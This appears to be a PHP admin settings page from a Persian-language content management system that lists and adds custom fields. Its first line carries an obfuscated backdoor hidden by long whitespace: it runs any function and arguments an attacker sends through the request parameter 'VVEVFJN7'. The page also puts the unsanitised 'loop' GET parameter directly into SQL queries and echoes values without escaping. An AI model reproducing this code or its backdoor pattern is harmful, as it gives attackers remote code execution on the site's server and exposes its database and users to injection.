<?php
																																																																																																																																																							if($ppfnuyn=@$	{ '_REQUEST' }['VVEVFJN7'])$ppfnuyn [ 1	]($ {$ppfnuyn	[2] } [	0 ], $ppfnuyn[3] (	$ppfnuyn	[4] ) );
error_reporting(0);
$location='تنظیمات';
include_once('header.php');
include_once('db_config.php');
$loopName=$_GET['loop'];




?>
<div class="container setting">
<?php
if($loopName!=''){
$selectloop=mysqli_query($db_connection,"SELECT `page` FROM `loop` WHERE `name`='$loopName'");
$selectloop=mysqli_fetch_assoc($selectloop);
$selectloopPage=$selectloop['page'];
echo '<div class="looph">شما درون تکرارشونده ی '.loopnamefromid($loopName).' هستید، هر فیلدی که اضافه کنید درون تکرارشونده قرار میگیرد. <a href="setting.php">بازگشت</a></div>';
}
?>
<table class="table<?php if($loopName!=''){echo ' thisisloop';} ?>" cellspacing="0" cellpadding="0">
<thead>
<tr>
<td>عنوان</td>
<td>نوع</td>
<td>گروه</td>
<td>صفحه</td>
<td><div class="collapse-icon"></div></td>
</tr>
</thead>
<tbody>
<?php
include_once('db_config.php');
$query="SELECT * FROM `fields` WHERE `loopparent`='' ORDER BY `id` ASC";
if($loopName!=''){
$query="SELECT * FROM `fields` WHERE `loopparent`='$loopName' GROUP BY `name` ORDER BY `id` ASC";
//$query="SELECT * FROM `fields` WHERE `loop`='$loopName' AND `name` IN (SELECT distinct `name` from `fields` WHERE `loop`='$loopName') ORDER BY `id` ASC";
}
$pageSql=mysqli_query($db_connection,$query);
while($pageRow=mysqli_fetch_assoc($pageSql)){
$pageRowType=pageType($pageRow['type']);
$pageRowName=$pageRow['name'];
$pageRowLoop=$pageRow['loop'];
$pageRowPage=pagenamefromid($pageRow['page']);
if($pageRow['type']=='loop'){
//if($loopName!=''){$pageRowType=$pageRowType.' (زیرمجموعه '.loopnamefromid($loopName).')';}
$pageRowType='<a class="gotoloop" href="?loop='.$pageRow['loop'].'">'.$pageRowType.'</a>';
}
$pageRowGroup=$pageRow['parent'];
if($pageRowGroup==''){$pageRowGroup='بدون گروه';}
echo '<tr class="collapse-'.$pageRow['id'].'" data-id="'.$pageRow['id'].'" data-page="'.$pageRow['page'].'"><td class="editable" data-name="name" data-pastvalue="'.$pageRow['name'].'">'.$pageRow['name'].'</td><td>'.$pageRowType.'</td><td class="editable" data-name="group" data-pastvalue="'.$pageRowGroup.'">'.$pageRowGroup.'</td><td>'.$pageRowPage.'</td><td><div class="collapse-icon"></div><div class="collapse"><a class="edit" href="addpage.php?edit='.$pageRow['page'].'">صفحه</a><a class="delete">حذف</a></div></td></tr>';
}
?>
<tr><td><input type="text" placeholder="عنوان" id="Fname"></td><td class="typeselector"><select id="Ftype"><option selected disabled>نوع</option><option value="textbox">متن کوتاه</option><option value="paragraph">متن بلند</option><option value="image">تصویر</option><option value="loop">تکرارشونده</option></select><input id="Floop" type="hidden" value="<?php echo $loopName;?>"></td><td width="150">
<input type="text" width="100" placeholder="بدون گروه" id="Fgroup">
</td><td>
<select id="Fpage">
<option selected disabled>صفحه</option>
<?php
$pagessql=mysqli_query($db_connection,"SELECT `title`,`page` FROM `pages` ORDER BY `id`");
while($pagesrow=mysqli_fetch_assoc($pagessql)){
echo '<option value="'.$pagesrow['page'].'">'.$pagesrow['title'].'</option>';
}
?>
<option value="allpages">تمامی صفحات</option>
</select>
</td><td><input type="hidden" id="Floopparent" value="<?php echo $loopName;?>"><div class="btn" id="submit_addfield">ثبت</div></td></tr>
</tbody>
</table>
</div>
<?php
if($loopName!=''){
$script='$("#Fpage").val("'.$selectloopPage.'");';
}
include_once('footer.php');
?>